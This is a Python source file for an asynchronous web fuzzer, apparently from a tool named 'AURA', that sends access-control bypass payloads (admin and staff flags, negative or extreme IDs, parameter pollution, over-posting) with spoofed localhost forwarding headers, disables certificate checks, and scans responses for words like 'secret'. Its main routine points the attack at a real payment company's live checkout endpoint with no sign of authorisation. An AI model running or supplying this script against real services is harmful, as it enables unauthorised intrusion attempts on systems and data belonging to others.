import asyncio
import httpx
import random
import string
from aura.ui.formatter import console

class LogicFuzzerV2:
    def __init__(self, target_url):
        self.target_url = target_url
        self.client = httpx.AsyncClient(verify=False, follow_redirects=True)
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "X-Forwarded-For": "127.0.0.1", # Bypass attempt
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1"
        }

    async def fuzz_parameters(self):
        console.print(f"[bold cyan]💀 AURA LOGIC FUZZER V2: STRIKING {self.target_url}[/bold cyan]")
        
        # Advanced Payloads: Parameter Pollution, Type Juggling, Over-posting
        payloads = [
            {"admin": "true"},
            {"role": "staff"},
            {"debug": "1"},
            {"internal": "true"},
            {"bypass": "true"},
            {"id": "0"},
            {"id": "-1"},
            {"id": "99999999"},
            {"config": '{"staff":true}'},
            {"user[admin]": "1"} # HPP
        ]
        
        for payload in payloads:
            try:
                console.print(f"[*] Testing payload: {payload}")
                # Try GET
                resp_get = await self.client.get(self.target_url, params=payload, headers=self.headers)
                # Try POST
                resp_post = await self.client.post(self.target_url, json=payload, headers=self.headers)
                
                if resp_get.status_code in [200, 201] or resp_post.status_code in [200, 201]:
                    # Check for "leaks" in response
                    if any(kw in resp_get.text.lower() or kw in resp_post.text.lower() for kw in ["staff", "internal", "config", "secret"]):
                        console.print(f"  [bold green][!] POTENTIAL HIT: {payload}[/bold green]")
            except Exception as e:
                console.print(f"  [red]Error: {e}[/red]")

    async def close(self):
        await self.client.aclose()

async def main():
    fuzzer = LogicFuzzerV2("https://www.paypal.com/checkoutnow") # Example hardened target
    await fuzzer.fuzz_parameters()
    await fuzzer.close()

if __name__ == "__main__":
    asyncio.run(main())
